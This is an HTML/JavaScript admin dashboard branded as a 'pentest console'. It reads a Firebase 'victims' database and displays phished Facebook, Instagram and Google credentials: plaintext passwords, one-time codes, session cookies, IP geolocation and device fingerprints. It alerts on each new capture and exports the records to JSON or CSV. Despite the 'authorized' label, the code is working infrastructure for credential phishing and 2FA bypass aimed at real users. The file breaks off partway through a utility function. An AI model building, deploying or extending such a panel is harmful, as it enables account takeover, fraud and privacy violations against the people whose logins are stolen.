<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SentinelOps // Pentest Console</title>

<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>

<style>
:root{
  --bg:#07080c; --bg2:#0c0e14; --panel:#10121a; --panel2:#151824;
  --border:#1c1f2e; --border2:#262a3d;
  --green:#00ff9c; --green-dim:#00c47a;
  --red:#ff4757; --gold:#ffc857; --cyan:#4dd8ff;
  --purple:#a78bfa; --orange:#ff9f43; --pink:#ff6bcb;
  --txt:#e6e9f0; --txt-dim:#7a8199; --txt-mute:#4a5169;
  --mono:'JetBrains Mono','SF Mono',Consolas,monospace;
}
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{
  font-family:var(--mono);
  background:var(--bg);
  color:var(--txt);
  font-size:13px;
  overflow:hidden;
}

/* ═══════════ LOCK ═══════════ */
.lock{
  position:fixed;inset:0;z-index:9999;
  background:
    radial-gradient(circle at 20% 20%,rgba(167,139,250,.15),transparent 40%),
    radial-gradient(circle at 80% 70%,rgba(0,255,156,.08),transparent 45%),
    linear-gradient(135deg,#07080c,#0f0a1a 50%,#07080c);
  display:flex;align-items:center;justify-content:center;
}
.lock::before{
  content:'';position:absolute;inset:0;
  background-image:
    linear-gradient(rgba(167,139,250,.04) 1px,transparent 1px),
    linear-gradient(90deg,rgba(167,139,250,.04) 1px,transparent 1px);
  background-size:40px 40px;
  mask-image:radial-gradient(circle at center,black,transparent 70%);
}
.lock-card{
  position:relative;
  background:rgba(16,18,26,.85);
  backdrop-filter:blur(20px);
  border:1px solid var(--border2);
  border-radius:20px;
  padding:44px 40px;
  width:min(420px,90vw);
  text-align:center;
  box-shadow:0 30px 80px rgba(0,0,0,.6),0 0 60px rgba(167,139,250,.1);
}
.lock-logo{
  font-size:52px;margin-bottom:16px;
  filter:drop-shadow(0 0 20px rgba(167,139,250,.6));
  animation:float 3s ease-in-out infinite;
}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
.lock-title{
  font-size:22px;letter-spacing:6px;color:var(--purple);
  font-weight:700;margin-bottom:6px;
}
.lock-sub{color:var(--txt-dim);font-size:11px;letter-spacing:2px;margin-bottom:28px}
.lock-input{
  width:100%;padding:14px 18px;
  background:rgba(0,0,0,.5);
  border:1.5px solid var(--border2);
  border-radius:10px;color:#fff;font-family:inherit;
  font-size:15px;text-align:center;letter-spacing:4px;
  outline:none;transition:.25s;
}
.lock-input:focus{border-color:var(--purple);box-shadow:0 0 0 4px rgba(167,139,250,.15)}
.lock-btn{
  width:100%;padding:14px;margin-top:14px;
  background:linear-gradient(135deg,var(--purple),#7c5cf0);
  color:#0a0a0f;border:none;border-radius:10px;
  font-family:inherit;font-size:14px;font-weight:700;
  letter-spacing:3px;cursor:pointer;transition:.25s;
}
.lock-btn:hover{transform:translateY(-1px);box-shadow:0 12px 30px rgba(167,139,250,.4)}
.lock-err{color:var(--red);font-size:12px;margin-top:12px;display:none}
.lock-foot{margin-top:24px;color:var(--txt-mute);font-size:10px;letter-spacing:1px}

/* ═══════════ SHELL ═══════════ */
.shell{display:none;height:100vh;width:100vw;grid-template-columns:230px 1fr}
.shell.on{display:grid}

/* Sidebar */
.side{
  background:var(--bg2);
  border-right:1px solid var(--border);
  display:flex;flex-direction:column;
  overflow:hidden;
}
.side-brand{
  padding:20px 18px;border-bottom:1px solid var(--border);
}
.side-brand h1{
  font-size:14px;letter-spacing:3px;color:var(--green);
  display:flex;align-items:center;gap:8px;
}
.side-brand h1 span{color:var(--purple)}
.side-brand p{color:var(--txt-mute);font-size:9px;letter-spacing:2px;margin-top:4px}
.side-nav{padding:12px 10px;flex:1;overflow-y:auto}
.side-label{
  color:var(--txt-mute);font-size:9px;letter-spacing:2px;
  padding:14px 10px 6px;text-transform:uppercase;
}
.nav-item{
  display:flex;align-items:center;gap:10px;
  padding:10px 12px;border-radius:8px;
  color:var(--txt-dim);cursor:pointer;
  font-size:12px;transition:.15s;user-select:none;
  border:1px solid transparent;
}
.nav-item:hover{background:var(--panel);color:var(--txt)}
.nav-item.on{
  background:rgba(0,255,156,.08);
  color:var(--green);
  border-color:rgba(0,255,156,.2);
}
.nav-item .ic{width:16px;text-align:center;font-size:13px}
.nav-item .badge{
  margin-left:auto;background:var(--panel2);
  color:var(--txt-dim);padding:1px 7px;
  border-radius:10px;font-size:10px;
}
.nav-item.on .badge{background:rgba(0,255,156,.15);color:var(--green)}

.side-foot{
  padding:12px;border-top:1px solid var(--border);
  display:flex;flex-direction:column;gap:6px;
}
.side-btn{
  padding:9px;border-radius:8px;border:1px solid var(--border2);
  background:var(--panel);color:var(--txt-dim);
  font-family:inherit;font-size:11px;cursor:pointer;
  letter-spacing:1px;transition:.15s;
}
.side-btn:hover{border-color:var(--green);color:var(--green)}
.side-btn.danger:hover{border-color:var(--red);color:var(--red)}

/* Main */
.main{display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
.topbar{
  height:56px;background:var(--bg2);
  border-bottom:1px solid var(--border);
  display:flex;align-items:center;
  padding:0 20px;gap:14px;flex-shrink:0;
}
.topbar-title{font-size:13px;letter-spacing:2px;color:var(--txt)}
.topbar-title span{color:var(--green)}
.topbar-spacer{flex:1}
.pill{
  display:flex;align-items:center;gap:7px;
  padding:5px 12px;border-radius:20px;
  background:var(--panel);border:1px solid var(--border2);
  font-size:11px;color:var(--txt-dim);
}
.pill.live{border-color:rgba(0,255,156,.3);color:var(--green)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:blink 1.4s infinite}
@keyframes blink{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(0,255,156,.6)}50%{opacity:.5;box-shadow:0 0 0 6px rgba(0,255,156,0)}}
.top-btn{
  padding:7px 14px;border-radius:8px;
  border:1px solid var(--border2);background:var(--panel);
  color:var(--txt);font-family:inherit;font-size:11px;
  cursor:pointer;letter-spacing:1px;transition:.15s;
}
.top-btn:hover{border-color:var(--cyan);color:var(--cyan)}
.top-btn.red:hover{border-color:var(--red);color:var(--red)}

.content{
  flex:1;overflow-y:auto;padding:20px;
  display:flex;flex-direction:column;gap:16px;
}
.content::-webkit-scrollbar{width:8px}
.content::-webkit-scrollbar-track{background:var(--bg)}
.content::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
.content::-webkit-scrollbar-thumb:hover{background:var(--purple)}

/* Stats */
.stats{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(130px,1fr));
  gap:10px;
}
.stat{
  background:var(--panel);
  border:1px solid var(--border);
  border-radius:12px;padding:16px 14px;
  cursor:pointer;transition:.2s;
  position:relative;overflow:hidden;
}
.stat::before{
  content:'';position:absolute;left:0;top:0;bottom:0;
  width:3px;background:var(--accent,var(--green));
  opacity:.5;transition:.2s;
}
.stat:hover{transform:translateY(-2px);border-color:var(--accent,var(--green))}
.stat:hover::before{opacity:1;width:4px}
.stat .num{
  font-size:26px;font-weight:700;color:var(--accent,var(--green));
  letter-spacing:-1px;line-height:1;
}
.stat .lbl{
  color:var(--txt-dim);font-size:10px;
  letter-spacing:2px;margin-top:6px;text-transform:uppercase;
}

/* Toolbar */
.toolbar{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.search{
  flex:1;min-width:220px;
  padding:11px 16px;background:var(--panel);
  border:1px solid var(--border);border-radius:10px;
  color:var(--txt);font-family:inherit;font-size:12px;
  outline:none;transition:.2s;
}
.search:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,156,.08)}
.filter-pills{display:flex;gap:6px;flex-wrap:wrap}
.fpill{
  padding:7px 13px;border-radius:20px;
  background:var(--panel);border:1px solid var(--border);
  color:var(--txt-dim);font-family:inherit;font-size:11px;
  cursor:pointer;transition:.15s;white-space:nowrap;
}
.fpill:hover{border-color:var(--green);color:var(--txt)}
.fpill.on{background:var(--green);color:#07080c;font-weight:700;border-color:var(--green)}

/* Victim cards */
.vlist{display:flex;flex-direction:column;gap:10px}
.vcard{
  background:var(--panel);
  border:1px solid var(--border);
  border-radius:12px;padding:16px 18px;
  transition:.2s;cursor:pointer;
  position:relative;
}
.vcard:hover{border-color:var(--border2);background:var(--panel2)}
.vcard.new{border-color:rgba(0,255,156,.4);box-shadow:0 0 0 3px rgba(0,255,156,.06)}
.vhead{
  display:flex;align-items:center;gap:12px;
  flex-wrap:wrap;margin-bottom:12px;
}
.vplat{
  padding:4px 11px;border-radius:6px;
  font-size:10px;font-weight:700;letter-spacing:1.5px;
  text-transform:uppercase;
}
.plat-facebook{background:rgba(24,119,242,.15);color:#4a9eff;border:1px solid rgba(24,119,242,.3)}
.plat-instagram{background:rgba(225,48,108,.15);color:#ff6bcb;border:1px solid rgba(225,48,108,.3)}
.plat-google{background:rgba(234,67,53,.15);color:#ff7a6b;border:1px solid rgba(234,67,53,.3)}
.plat-other{background:rgba(167,139,250,.15);color:var(--purple);border:1px solid rgba(167,139,250,.3)}
.vemail{font-size:13px;color:var(--cyan);font-weight:600;word-break:break-all}
.vtime{margin-left:auto;font-size:10px;color:var(--txt-mute);letter-spacing:1px}
.vtags{display:flex;gap:6px}
.tag{
  padding:2px 8px;border-radius:4px;
  font-size:9px;font-weight:700;letter-spacing:1px;
}
.tag-otp{background:rgba(255,159,67,.15);color:var(--orange);border:1px solid rgba(255,159,67,.3)}
.tag-cookie{background:rgba(77,216,255,.15);color:var(--cyan);border:1px solid rgba(77,216,255,.3)}
.tag-cred{background:rgba(255,71,87,.15);color:var(--red);border:1px solid rgba(255,71,87,.3)}

.vgrid{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(170px,1fr));
  gap:8px;
}
.cell{
  background:rgba(0,0,0,.25);
  border:1px solid var(--border);
  border-radius:8px;padding:9px 11px;
}
.cell .k{
  color:var(--txt-mute);font-size:9px;
  letter-spacing:1.5px;text-transform:uppercase;
}
.cell .v{
  color:var(--txt);font-size:12px;
  margin-top:4px;word-break:break-all;
}
.cell .v.sens{color:var(--red);font-weight:700}
.cell .v.otp{color:var(--orange);font-weight:700;letter-spacing:2px}
.cell .v.ck{color:var(--cyan);font-size:10px;max-height:34px;overflow:hidden;text-overflow:ellipsis}

.vfoot{
  display:flex;justify-content:flex-end;gap:6px;
  margin-top:12px;padding-top:12px;
  border-top:1px solid var(--border);
}
.mini{
  padding:6px 12px;border-radius:6px;
  border:1px solid var(--border2);background:transparent;
  color:var(--txt-dim);font-family:inherit;font-size:10px;
  cursor:pointer;letter-spacing:1px;transition:.15s;
}
.mini:hover{border-color:var(--green);color:var(--green)}
.mini.red:hover{border-color:var(--red);color:var(--red)}

.empty{
  text-align:center;padding:60px 20px;
  color:var(--txt-mute);font-size:13px;letter-spacing:2px;
}
.empty .big{font-size:40px;margin-bottom:14px;opacity:.4}

/* Modal */
.modal-bg{
  position:fixed;inset:0;z-index:500;
  background:rgba(0,0,0,.75);backdrop-filter:blur(6px);
  display:none;align-items:center;justify-content:center;
  padding:20px;
}
.modal-bg.on{display:flex}
.modal{
  background:var(--panel);border:1px solid var(--border2);
  border-radius:16px;width:min(720px,100%);
  max-height:85vh;overflow:hidden;display:flex;flex-direction:column;
  box-shadow:0 30px 80px rgba(0,0,0,.7);
}
.modal-h{
  padding:18px 22px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:12px;
}
.modal-h h2{font-size:14px;letter-spacing:2px;color:var(--green)}
.modal-h .close{
  margin-left:auto;width:30px;height:30px;border-radius:8px;
  background:transparent;border:1px solid var(--border2);
  color:var(--txt-dim);cursor:pointer;font-size:16px;
}
.modal-h .close:hover{border-color:var(--red);color:var(--red)}
.modal-b{padding:22px;overflow-y:auto}
.modal-b::-webkit-scrollbar{width:6px}
.modal-b::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
.kv{
  display:flex;gap:14px;padding:9px 0;
  border-bottom:1px solid var(--border);
}
.kv .k{
  color:var(--txt-dim);font-size:11px;
  letter-spacing:1px;min-width:120px;text-transform:uppercase;
}
.kv .v{color:var(--txt);font-size:12px;word-break:break-all;flex:1}

/* Toast */
.toasts{
  position:fixed;top:20px;right:20px;z-index:9998;
  display:flex;flex-direction:column;gap:8px;
}
.toast{
  background:var(--panel);border:1px solid var(--green);
  border-radius:10px;padding:12px 16px;
  min-width:260px;box-shadow:0 10px 40px rgba(0,255,156,.2);
  animation:slideIn .3s ease;
}
@keyframes slideIn{from{transform:translateX(120%);opacity:0}to{transform:translateX(0);opacity:1}}
.toast .t{color:var(--green);font-size:11px;letter-spacing:2px;font-weight:700}
.toast .m{color:var(--txt);font-size:12px;margin-top:4px}

/* Mobile */
@media(max-width:820px){
  .shell.on{grid-template-columns:1fr}
  .side{display:none}
  .side.open{display:flex;position:fixed;z-index:400;inset:0 auto 0 0;width:230px}
}
</style>
</head>
<body>

<!-- LOCK -->
<div class="lock" id="lock">
  <div class="lock-card">
    <div class="lock-logo">🛡️</div>
    <div class="lock-title">SENTINELOPS</div>
    <div class="lock-sub">AUTHORIZED PENTEST CONSOLE</div>
    <input type="password" class="lock-input" id="pw" placeholder="••••••••" autocomplete="off">
    <button class="lock-btn" onclick="unlock()">AUTHENTICATE</button>
    <div class="lock-err" id="pwErr">✕ ACCESS DENIED</div>
    <div class="lock-foot">OPERATOR: <span style="color:var(--purple)">AhmedTasnimX</span> · v4.0</div>
  </div>
</div>

<!-- SHELL -->
<div class="shell" id="shell">
  <!-- SIDEBAR -->
  <aside class="side" id="side">
    <div class="side-brand">
      <h1>🛡️ SENTINEL<span>OPS</span></h1>
      <p>PENTEST CONSOLE v4</p>
    </div>
    <nav class="side-nav">
      <div class="side-label">Operations</div>
      <div class="nav-item on" data-view="feed" onclick="switchView('feed')">
        <span class="ic">📡</span> Live Feed <span class="badge" id="badgeFeed">0</span>
      </div>
      <div class="nav-item" data-view="vault" onclick="switchView('vault')">
        <span class="ic">🗄️</span> Cred Vault <span class="badge" id="badgeVault">0</span>
      </div>
      <div class="nav-item" data-view="otp" onclick="switchView('otp')">
        <span class="ic">🔑</span> OTP Intel <span class="badge" id="badgeOtp">0</span>
      </div>
      <div class="nav-item" data-view="cookies" onclick="switchView('cookies')">
        <span class="ic">🍪</span> Cookie Jar <span class="badge" id="badgeCookie">0</span>
      </div>
      <div class="nav-item" data-view="devices" onclick="switchView('devices')">
        <span class="ic">💻</span> Devices <span class="badge" id="badgeDevices">0</span>
      </div>
      <div class="side-label">Analytics</div>
      <div class="nav-item" data-view="stats" onclick="switchView('stats')">
        <span class="ic">📊</span> Statistics
      </div>
      <div class="side-label">Data</div>
      <div class="nav-item" data-view="export" onclick="switchView('export')">
        <span class="ic">📥</span> Export
      </div>
    </nav>
    <div class="side-foot">
      <button class="side-btn" onclick="toggleSide()">☰ Menu</button>
      <button class="side-btn danger" onclick="lockNow()">🔒 Lock</button>
    </div>
  </aside>

  <!-- MAIN -->
  <main class="main">
    <div class="topbar">
      <div class="topbar-title" id="viewTitle">LIVE <span>FEED</span></div>
      <div class="topbar-spacer"></div>
      <div class="pill live"><span class="dot"></span> CONNECTED</div>
      <div class="pill" id="clock">--:--:--</div>
      <button class="top-btn" onclick="refreshAll()">↻ Sync</button>
      <button class="top-btn red" onclick="lockNow()">Lock</button>
    </div>

    <div class="content" id="content">
      <!-- Stats -->
      <div class="stats" id="stats"></div>

      <!-- Toolbar -->
      <div class="toolbar">
        <input type="text" class="search" id="search" placeholder="🔍 search email / ip / otp / cookie / device..." oninput="applySearch(this.value)">
        <div class="filter-pills" id="fpills"></div>
      </div>

      <!-- List -->
      <div class="vlist" id="vlist"></div>
    </div>
  </main>
</div>

<!-- MODAL -->
<div class="modal-bg" id="modalBg" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-h">
      <h2 id="modalTitle">RECORD DETAIL</h2>
      <button class="close" onclick="closeModal()">✕</button>
    </div>
    <div class="modal-b" id="modalBody"></div>
  </div>
</div>

<!-- TOASTS -->
<div class="toasts" id="toasts"></div>

<script src="./config.js"></script>
<script>
/* ════════════════════════════════════════════
   CONFIG
   ════════════════════════════════════════════ */
const PASSWORD = "Sorwer Sir";

/* ════════════════════════════════════════════
   STATE
   ════════════════════════════════════════════ */
let db = null;
let victims = {};
let view = 'feed';
let filter = 'all';
let searchQ = '';
let firstLoad = true;
const seenIds = new Set();

/* ════════════════════════════════════════════
   LOCK
   ════════════════════════════════════════════ */
function unlock(){
  const v = document.getElementById('pw').value;
  if(v === PASSWORD){
    document.getElementById('lock').style.display='none';
    document.getElementById('shell').classList.add('on');
    sessionStorage.setItem('sx','1');
    bootFirebase();
  } else {
    document.getElementById('pwErr').style.display='block';
    document.getElementById('pw').value='';
  }
}
document.getElementById('pw').addEventListener('keydown',e=>{if(e.key==='Enter')unlock()});

function lockNow(){
  sessionStorage.removeItem('sx');
  document.getElementById('shell').classList.remove('on');
  document.getElementById('lock').style.display='flex';
  document.getElementById('pw').value='';
  document.getElementById('pwErr').style.display='none';
}

if(sessionStorage.getItem('sx')==='1'){
  document.getElementById('lock').style.display='none';
  document.getElementById('shell').classList.add('on');
  bootFirebase();
}

/* ════════════════════════════════════════════
   FIREBASE
   ════════════════════════════════════════════ */
function bootFirebase(){
  if(db) return;
  try{
    firebase.initializeApp(window.firebaseConfig);
    db = firebase.database();

    db.ref('victims').on('value', snap=>{
      victims = snap.val() || {};
      if(firstLoad){
        Object.keys(victims).forEach(id=>seenIds.add(id));
        firstLoad = false;
      }
      renderAll();
    });

    db.ref('victims').on('child_added', snap=>{
      const id = snap.key;
      const v = snap.val();
      if(seenIds.has(id)) return;
      seenIds.add(id);
      toast('NEW CAPTURE', (v.platform||'unknown') + ' · ' + (v.email || v.username || 'unknown'));
      beep();
      if(Notification.permission==='granted'){
        new Notification('🛡️ SentinelOps', {
          body:(v.platform||'unknown')+' · '+(v.email||v.username||'unknown')
        });
      }
    });
  }catch(e){
    console.error('firebase init', e);
  }
}
if(Notification.permission==='default') Notification.requestPermission();

/* ════════════════════════════════════════════
   NORMALIZERS — backward compatible
   ════════════════════════════════════════════ */
function getCookie(v){
  if(!v) return '';
  if(typeof v.cookies==='string' && v.cookies) return v.cookies;
  if(typeof v.cookieData==='string' && v.cookieData) return v.cookieData;
  if(typeof v.cookieString==='string' && v.cookieString) return v.cookieString;
  if(v.cookies && typeof v.cookies==='object'){
    const e=Object.entries(v.cookies);
    if(e.length) return e.map(([k,x])=>k+'='+x).join('; ');
  }
  if(v.cookieData && typeof v.cookieData==='object'){
    const e=Object.entries(v.cookieData);
    if(e.length) return e.map(([k,x])=>k+'='+x).join('; ');
  }
  return '';
}
function getOTP(v){ return v.otp || v.otpCode || v.otp_input || ''; }
function getIP(v){ return v.ipInfo?.ip || v.ip || v.ipAddress || 'N/A'; }
function getEmail(v){ return v.email || v.username || v.fullName || 'unknown'; }
function getPass(v){ return v.password || v.pass || 'N/A'; }
function getTime(v){
  if(!v.timestamp) return '—';
  try{ return new Date(v.timestamp).toLocaleString(); }catch(e){ return String(v.timestamp); }
}
function hasCookie(v){ return getCookie(v).length>0; }
function hasOTP(v){ return getOTP(v).length>0; }
function platformOf(v){ return (v.platform||'other').toLowerCase(); }

/* ════════════════════════════════════════════
   STATS
   ════════════════════════════════════════════ */
function computeStats(){
  const s={total:0,facebook:0,instagram:0,google:0,other:0,otp:0,cookie:0,devices:new Set()};
  Object.values(victims).forEach(v=>{
    if(!v) return;
    s.total++;
    const p=platformOf(v);
    if(p==='facebook')s.facebook++;
    else if(p==='instagram')s.instagram++;
    else if(p==='google')s.google++;
    else s.other++;
    if(hasOTP(v))s.otp++;
    if(hasCookie(v))s.cookie++;
    const d=(v.deviceInfo?.device||'')+'|'+(v.deviceInfo?.os||'')+'|'+(v.deviceInfo?.browser||'');
    if(d.trim().length>2) s.devices.add(d);
  });
  s.devices = s.devices.size;
  return s;
}

/* ════════════════════════════════════════════
   RENDER
   ════════════════════════════════════════════ */
function renderAll(){
  const s = computeStats();
  renderStats(s);
  renderFilterPills();
  renderBadges(s);
  renderList();
  updateClock();
}

function renderStats(s){
  const cards=[
    {n:s.total,   l:'TOTAL',     a:'var(--green)',  f:'all'},
    {n:s.facebook,l:'FACEBOOK',  a:'#4a9eff',       f:'facebook'},
    {n:s.instagram,l:'INSTAGRAM',a:'#ff6bcb',       f:'instagram'},
    {n:s.google,  l:'GOOGLE',    a:'#ff7a6b',       f:'google'},
    {n:s.other,   l:'OTHERS',    a:'var(--purple)', f:'other'},
    {n:s.otp,     l:'OTP',       a:'var(--orange)', f:'otp'},
    {n:s.cookie,  l:'COOKIE',    a:'var(--cyan)',   f:'cookie'},
    {n:s.devices, l:'DEVICES',   a:'var(--gold)',   f:'devices'},
  ];
  document.getElementById('stats').innerHTML = cards.map(c=>`
    <div class="stat" style="--accent:${c.a}" onclick="quickFilter('${c.f}')">
      <div class="num">${c.n}</div>
      <div class="lbl">${c.l}</div>
    </div>`).join('');
}

function renderFilterPills(){
  const pills=[
    ['all','All'],['facebook','Facebook'],['instagram','Instagram'],
    ['google','Google'],['other','Others'],['otp','🔑 OTP'],['cookie','🍪 Cookie']
  ];
  document.getElementById('fpills').innerHTML = pills.map(([k,l])=>`
    <button class="fpill ${filter===k?'on':''}" onclick="setFilter('${k}')">${l}</button>
  `).join('');
}

function renderBadges(s){
  document.getElementById('badgeFeed').textContent = s.total;
  document.getElementById('badgeVault').textContent = s.total;
  document.getElementById('badgeOtp').textContent = s.otp;
  document.getElementById('badgeCookie').textContent = s.cookie;
  document.getElementById('badgeDevices').textContent = s.devices;
}

function filteredIds(){
  const ids = Object.keys(victims);
  let out = ids.filter(id=>{
    const v = victims[id];
    if(!v) return false;

    // view scoping
    if(view==='otp' && !hasOTP(v)) return false;
    if(view==='cookies' && !hasCookie(v)) return false;
    if(view==='vault' && !getPass(v)) return false;

    // filter
    if(filter==='otp' && !hasOTP(v)) return false;
    if(filter==='cookie' && !hasCookie(v)) return false;
    if(filter==='other' && ['facebook','instagram','google'].includes(platformOf(v))) return false;
    if(['facebook','instagram','google'].includes(filter) && platformOf(v)!==filter) return false;

    // search
    if(searchQ){
      const hay = JSON.stringify(v).toLowerCase();
      if(!hay.includes(searchQ)) return false;
    }
    return true;
  });

  out.sort((a,b)=>{
    const ta = victims[a].timestamp || 0;
    const tb = victims[b].timestamp || 0;
    return new Date(tb) - new Date(ta);
  });
  return out;
}

function renderList(){
  const ids = filteredIds();
  const el = document.getElementById('vlist');
  if(!ids.length){
    el.innerHTML = `<div class="empty"><div class="big">📭</div>NO RECORDS IN THIS VIEW</div>`;
    return;
  }
  el.innerHTML = ids.map(id=>cardHTML(victims[id], id)).join('');
}

function cardHTML(v, id){
  const p = platformOf(v);
  const platClass = ['facebook','instagram','google'].includes(p) ? 'plat-'+p : 'plat-other';
  const email = getEmail(v);
  const pass  = getPass(v);
  const otp   = getOTP(v);
  const ck    = getCookie(v);
  const ip    = getIP(v);
  const city  = v.ipInfo?.city || '—';
  const country = v.ipInfo?.country || '—';
  const isp   = v.ipInfo?.isp || '—';
  const dev   = v.deviceInfo?.device || '—';
  const os    = v.deviceInfo?.os || '—';
  const br    = v.deviceInfo?.browser || '—';
  const fresh = !seenIds.has(id) || (Date.now() - new Date(v.timestamp||0).getTime() < 60000);

  const tags = [];
  if(otp) tags.push('<span class="tag tag-otp">OTP</span>');
  if(ck)  tags.push('<span class="tag tag-cookie">COOKIE</span>');
  if(pass && pass!=='N/A') tags.push('<span class="tag tag-cred">CRED</span>');

  return `
  <div class="vcard ${fresh?'new':''}" onclick="openDetail('${id}')">
    <div class="vhead">
      <span class="vplat ${platClass}">${p}</span>
      <span class="vemail">${esc(email)}</span>
      <div class="vtags">${tags.join('')}</div>
      <span class="vtime">${getTime(v)}</span>
    </div>
    <div class="vgrid">
      <div class="cell">
        <div class="k">Password</div>
        <div class="v sens">${esc(pass)}</div>
      </div>
      ${otp?`<div class="cell"><div class="k">OTP</div><div class="v otp">${esc(otp)}</div></div>`:''}
      <div class="cell"><div class="k">IP</div><div class="v">${esc(ip)}</div></div>
      <div class="cell"><div class="k">Location</div><div class="v">${esc(city)}, ${esc(country)}</div></div>
      <div class="cell"><div class="k">ISP</div><div class="v">${esc(isp)}</div></div>
      <div class="cell"><div class="k">Device</div><div class="v">${esc(dev)} · ${esc(os)}</div></div>
      <div class="cell"><div class="k">Browser</div><div class="v">${esc(br)}</div></div>
      ${ck?`<div class="cell" style="grid-column:1/-1"><div class="k">Cookie</div><div class="v ck">${esc(ck.slice(0,160))}${ck.length>160?'…':''}</div></div>`:''}
    </div>
    <div class="vfoot">
      <button class="mini" onclick="event.stopPropagation();copyRecord('${id}')">📋 Copy</button>
      <button class="mini red" onclick="event.stopPropagation();delRecord('${id}')">🗑️ Delete</button>
    </div>
  </div>`;
}

/* ════════════════════════════════════════════
   DETAIL MODAL
   ════════════════════════════════════════════ */
function openDetail(id){
  const v = victims[id];
  if(!v) return;
  const rows = flatten(v);
  document.getElementById('modalTitle').textContent = 'RECORD · ' + id.slice(0,10).toUpperCase();
  document.getElementById('modalBody').innerHTML =
    rows.map(([k,val])=>`<div class="kv"><div class="k">${esc(k)}</div><div class="v">${esc(val)}</div></div>`).join('') +
    `<div style="margin-top:18px;display:flex;gap:8px;justify-content:flex-end">
       <button class="mini" onclick="copyRecord('${id}')">📋 Copy JSON</button>
       <button class="mini red" onclick="delRecord('${id}')">🗑️ Delete Record</button>
     </div>`;
  document.getElementById('modalBg').classList.add('on');
}
function closeModal(){ document.getElementById('modalBg').classList.remove('on'); }

function flatten(obj, prefix='', out=[]){
  if(obj===null||obj===undefined) return out;
  if(typeof obj!=='object'){ out.push([prefix||'value', String(obj)]); return out; }
  if(Array.isArray(obj)){ obj.forEach((x,i)=>flatten(x,prefix+'['+i+']',out)); return out; }
  Object.entries(obj).forEach(([k,val])=>{
    const key = prefix?prefix+'.'+k:k;
    if(val && typeof val==='object' && !Array.isArray(val)){
      const cookieStr = k==='cookies'||k==='cookieData';
      if(cookieStr){
        out.push([key, Object.entries(val).map(([a,b])=>a+'='+b).join('; ')]);
      } else flatten(val,key,out);
    } else if(Array.isArray(val)){
      out.push([key, val.join(', ')]);
    } else {
      out.push([key, val===null?'null':String(val)]);
    }
  });
  return out;
}

/* ════════════════════════════════════════════
   ACTIONS
   ════════════════════════════════════════════ */
function setFilter(f){
  if(view==='otp' && f!=='all' && f!=='otp') view='feed';
  filter = f;
  if(f==='devices'){ view='devices'; filter='all'; }
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('on'));
  const nav = document.querySelector(`.nav-item[data-view="${view}"]`);
  if(nav) nav.classList.add('on');
  document.getElementById('viewTitle').innerHTML = titleFor(view, filter);
  renderAll();
}

function quickFilter(f){
  if(f==='devices'){ switchView('devices'); return; }
  setFilter(f);
}

function switchView(v){
  view = v;
  filter = 'all';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('on'));
  const nav = document.querySelector(`.nav-item[data-view="${v}"]`);
  if(nav) nav.classList.add('on');
  document.getElementById('viewTitle').innerHTML = titleFor(v, 'all');
  renderAll();
}

function titleFor(v, f){
  if(v==='otp') return 'OTP <span>INTEL</span>';
  if(v==='cookies') return 'COOKIE <span>JAR</span>';
  if(v==='vault') return 'CREDENTIAL <span>VAULT</span>';
  if(v==='devices') return 'DEVICE <span>FINGERPRINTS</span>';
  if(v==='stats') return 'OPERATIONAL <span>STATS</span>';
  if(v==='export') return 'DATA <span>EXPORT</span>';
  if(f==='all') return 'LIVE <span>FEED</span>';
  return f.toUpperCase() + ' <span>FILTER</span>';
}

function applySearch(q){ searchQ = q.trim().toLowerCase(); renderList(); }

function delRecord(id){
  if(!confirm('Delete record '+id+'?')) return;
  db.ref('victims/'+id).remove().then(()=>{
    delete victims[id];
    closeModal();
    renderAll();
  });
}

function copyRecord(id){
  const v = victims[id];
  if(!v) return;
  navigator.clipboard.writeText(JSON.stringify(v, null, 2)).then(()=>toast('COPIED','Record cloned to clipboard'));
}

function refreshAll(){ renderAll(); toast('SYNCED','State refreshed from database'); }

/* ════════════════════════════════════════════
   EXPORT
   ════════════════════════════════════════════ */
function exportJSON(){
  const blob = new Blob([JSON.stringify(victims, null, 2)], {type:'application/json'});
  download(blob, 'sentinelops_'+Date.now()+'.json');
  toast('EXPORTED','JSON download started');
}
function exportCSV(){
  const rows = [['id','timestamp','platform','email','password','otp','cookie','ip','city','country','isp','device','os','browser']];
  Object.entries(victims).forEach(([id,v])=>{
    rows.push([
      id,
      v.timestamp || '',
      v.platform || '',
      getEmail(v),
      getPass(v),
      getOTP(v),
      getCookie(v).replace(/[;,\n\r]/g,' '),
      getIP(v),
      v.ipInfo?.city || '',
      v.ipInfo?.country || '',
      v.ipInfo?.isp || '',
      v.deviceInfo?.device || '',
      v.deviceInfo?.os || '',
      v.deviceInfo?.browser || ''
    ]);
  });
  const csv = rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n');
  const blob = new Blob([csv], {type:'text/csv'});
  download(blob, 'sentinelops_'+Date.now()+'.csv');
  toast('EXPORTED','CSV download started');
}
function download(blob, name){
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = name; a.click();
  URL.revokeObjectURL(url);
}

/* ════════════════════════════════════════════
   UTILS
   ════════════════════════════════════════════ */
function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }

function toast(title, msg){
  const el = document.createElement('div');
  el.className='toast';
